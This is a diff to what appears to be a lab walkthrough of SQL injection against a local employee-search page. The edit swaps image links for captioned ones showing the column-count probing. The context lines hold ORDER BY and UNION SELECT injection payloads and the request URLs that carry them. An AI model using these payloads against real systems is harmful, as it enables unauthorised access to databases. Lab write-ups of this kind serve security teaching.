@@ -275,9 +275,9 @@ if __name__ == "__main__":
 > ' ORDER BY 1-- -
 
 > http://192.168.86.200/home.php?action=search&first_name=%27+ORDER+BY+5--+-&last_name=
-> ![](image_33.png)
-> ![](image_32.png)
-> ![](image_34.png)
+> ![ORDER BY 4 works - employees sorted by birth date](https://github.com/user-attachments/assets/c0f6c22b-308b-4ba4-a612-bffc0560d2a2)
+> ![ORDER BY 1 works - employees sorted by Id](https://github.com/user-attachments/assets/da2e1c59-ea9c-4da1-8a15-b9f00c85f795)
+> ![ORDER BY 5 fails - Number of Employees 0, column count is 4](https://github.com/user-attachments/assets/2f657bd3-2fce-496a-b4ad-d4a84ad053d2)
 
 > ' UNION select * from employees'
 > http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
